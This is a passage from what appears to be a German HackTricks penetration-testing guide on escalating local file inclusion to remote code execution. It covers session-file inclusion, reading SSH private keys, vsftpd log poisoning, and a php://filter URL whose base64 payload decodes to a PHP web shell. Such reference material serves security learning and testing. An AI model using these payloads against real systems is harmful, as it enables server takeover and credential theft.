Verwenden Sie LFI, um die PHP-Sitzungsdatei einzuschließen
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Über SSH

Wenn SSH aktiv ist, überprüfen Sie, welcher Benutzer verwendet wird (/proc/self/status & /etc/passwd) und versuchen Sie auf **\<HOME>/.ssh/id\_rsa** zuzugreifen.

### Über vsftpd-Protokoll

Die Protokolldateien für den FTP-Server vsftpd befinden sich unter **_/var/log/vsftpd.log_**. Wenn eine Local File Inclusion (LFI)-Schwachstelle besteht und der Zugriff auf einen freigegebenen vsftpd-Server möglich ist, können die folgenden Schritte unternommen werden:

1. Fügen Sie während des Anmeldevorgangs eine PHP-Payload in das Benutzernamenfeld ein.
2. Nach der Injektion verwenden Sie die LFI, um die Serverprotokolle aus **_/var/log/vsftpd.log_** abzurufen.

### Über den PHP Base64-Filter (mit base64)

Wie in [diesem](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) Artikel gezeigt, ignoriert der PHP Base64-Filter einfach Nicht-Base64. Sie können dies verwenden, um die Dateierweiterungsprüfung zu umgehen: Wenn Sie Base64 bereitstellen, das mit ".php" endet, ignoriert es einfach den "." und fügt "php" an das Base64 an. Hier ist ein Beispiel-Payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Über php-Filter (keine Datei erforderlich)

Dieses [**Writeup**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) erklärt, dass Sie **php-Filter verwenden können, um beliebigen Inhalt** als Ausgabe zu generieren. Das bedeutet im Grunde genommen, dass Sie **beliebigen PHP-Code generieren können**, der in die Include-Anweisung einbezogen wird, **ohne ihn in eine Datei schreiben zu müssen**.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Über Segmentation Fault

**Laden** Sie eine Datei hoch, die vorübergehend in `/tmp` gespeichert wird, und lösen Sie dann im **selben Request** einen **Segmentation Fault** aus. Die **vorübergehende Datei wird nicht gelöscht**, und Sie können danach suchen.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Über Nginx-Temporärspeicherung von Dateien

Wenn Sie eine **Local File Inclusion** gefunden haben und **Nginx** vor PHP ausgeführt wird, können Sie möglicherweise RCE mit der folgenden Technik erzielen:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Über PHP\_SESSION\_UPLOAD\_PROGRESS

Wenn Sie eine **Local File Inclusion** gefunden haben, auch wenn Sie **keine Sitzung** haben und `session.auto_start` auf `Off` steht. Wenn Sie die **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST**-Daten bereitstellen, aktiviert PHP die Sitzung für Sie. Sie könnten dies missbrauchen, um RCE zu erlangen:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Über temporäre Datei-Uploads in Windows

Wenn Sie eine **Local File Inclusion** gefunden haben und der Server unter **Windows** läuft, können Sie möglicherweise RCE erlangen:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Über phpinfo() (file\_uploads = on)

Wenn Sie eine **Local File Inclusion** gefunden haben und eine Datei, die **phpinfo()** mit file\_uploads = on offenlegt, können Sie RCE erlangen:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Über compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Pfadoffenlegung

Wenn Sie eine **Local File Inclusion** gefunden haben und Sie den **Pfad der temporären Datei exfiltrieren können**, der **Server** jedoch **überprüft**, ob die **einzuschließende Datei PHP-Markierungen enthält**, können Sie versuchen, diese Überprüfung mit dieser **Race Condition** zu umgehen:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Über endloses Warten + Brute Force

Wenn Sie die LFI missbrauchen können, um **vorübergehende Dateien hochzuladen** und den PHP-Code auf dem Server **anhaltend** zu machen, könnten Sie dann **Stunden damit verbringen, Dateinamen zu erraten**, um die vorübergehende Datei zu finden:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Zu einem Fatal Error

Wenn Sie eine der Dateien `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` einbinden (Sie müssen dieselbe Datei zweimal einbinden, um diesen Fehler auszulösen).

**Ich weiß nicht, wie das nützlich sein könnte, aber es könnte sein.**\
_Auch wenn Sie einen PHP Fatal Error verursachen, werden temporäre PHP-Dateien gelöscht._

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## Referenzen

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-Jägern zu kommunizieren!

**Hacking Insights**\
Beschäftigen Sie sich mit Inhalten, die sich mit dem Nervenkitzel und den Herausforderungen des Hackens befassen.

**Echtzeit-Hack-News**\
Bleiben Sie mit der schnelllebigen Hacking-Welt durch Echtzeit-Nachrichten und Einblicke auf dem Laufenden.

**Neueste Ankündigungen**\
Bleiben Sie über die neuesten Bug-Bounties und wichtigen Plattformupdates informiert.

**Treten Sie uns bei** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **bei und beginnen Sie noch heute mit der Zusammenarbeit mit Top-Hackern!**

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen** möchten, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder folgen Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) **und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.**

</details>
